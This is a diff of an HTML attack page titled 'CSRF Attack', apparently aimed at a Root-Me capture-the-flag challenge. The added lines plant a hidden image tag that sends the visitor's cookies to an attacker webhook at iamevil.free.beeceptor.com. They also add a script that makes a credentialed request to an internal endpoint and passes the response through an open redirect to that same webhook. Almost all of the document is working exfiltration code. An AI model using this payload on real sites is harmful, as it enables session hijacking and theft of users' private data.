@@ -4,20 +4,26 @@
     <title>CSRF Attack</title>
 </head>
 <body>
+    <!-- This will cause the browser to make a request to our webhook with the cookie -->
+    <img src="https://iamevil.free.beeceptor.com/steal?cookie=<%=document.cookie%>" style="display:none">
+    
+    <!-- Direct XHR request to endpoints that might contain the flag -->
     <script>
-        // Try XHR with specific settings
+        // Try making an XHR request to a potentially vulnerable endpoint
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'http://127.0.0.1:58039/home', true);
+        xhr.open('GET', 'http://127.0.0.1:58039/api/rules/1', true);
         xhr.withCredentials = true;
-        xhr.onload = function() {
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://your-webhook-url?home=' + encodeURIComponent(xhr.responseText);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/data?response=' + encodeURIComponent(xhr.responseText);
+            }
         };
         xhr.send();
         
-        // Fallback
+        // Fallback redirect
         setTimeout(function() {
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://your-webhook-url?timeout=true';
-        }, 1500);
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/timeout';
+        }, 2000);
     </script>
 </body>
 </html>
